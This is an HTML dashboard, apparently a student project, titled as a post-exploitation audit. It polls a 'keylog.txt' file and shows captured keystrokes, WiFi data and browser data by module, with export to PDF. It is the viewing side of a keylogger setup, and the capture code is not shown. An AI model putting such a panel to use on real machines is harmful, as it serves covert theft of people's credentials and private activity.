<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>NEBULOS | Dashboard TFG</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .box { border: 1px solid #0f0; padding: 15px; min-height: 500px; }
        .nav { margin-bottom: 15px; }
        button { background: #000; color: #0f0; border: 1px solid #0f0; padding: 8px; cursor: pointer; margin-right: 5px; }
        button:hover, .active { background: #0f0; color: #000; }
        #log { white-space: pre-wrap; height: 400px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; }
        .red { color: #f00; border-color: #f00; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ NEBULOS SYSTEM ] - Auditoría de Post-Explotación</h2>
        <div class="nav">
            <button class="b active" onclick="show('full')">REPORTE</button>
            <button class="b" onclick="show('wifi')">WIFI</button>
            <button class="b" onclick="show('nav')">NAVEGADOR</button>
            <button class="b" onclick="show('keys')">TECLADO</button>
            <button class="red" onclick="dl()">DESCARGAR PDF</button>
        </div>
        <div id="log">Conectando...</div>
    </div>

    <script>
        let data = "";
        async function load() {
            try {
                const r = await fetch('keylog.txt?t=' + Math.random());
                if (r.ok) { data = await r.text(); show('full'); }
            } catch (e) {}
        }

        function show(mode) {
            document.querySelectorAll('.b').forEach(b => b.classList.remove('active'));
            if (event) event.target.classList.add('active');
            const log = document.getElementById('log');
            if (mode === 'wifi') log.textContent = data.split('--- MODULO WIFI ---')[1].split('--- MODULO NAVEGADOR ---')[0];
            else if (mode === 'nav') log.textContent = data.split('--- MODULO NAVEGADOR ---')[1].split('--- MODULO KEYLOGGER ---')[0];
            else if (mode === 'keys') log.textContent = data.split('--- MODULO KEYLOGGER ---')[1];
            else log.textContent = data;
        }

        function dl() {
            const doc = new jspdf.jsPDF();
            doc.text("NEBULOS REPORT - TFG DAM", 10, 10);
            const lines = doc.splitTextToSize(data, 180);
            doc.text(lines, 10, 20);
            doc.save("auditoria.pdf");
        }

        setInterval(load, 30000); load();
    </script>
</body>
</html>
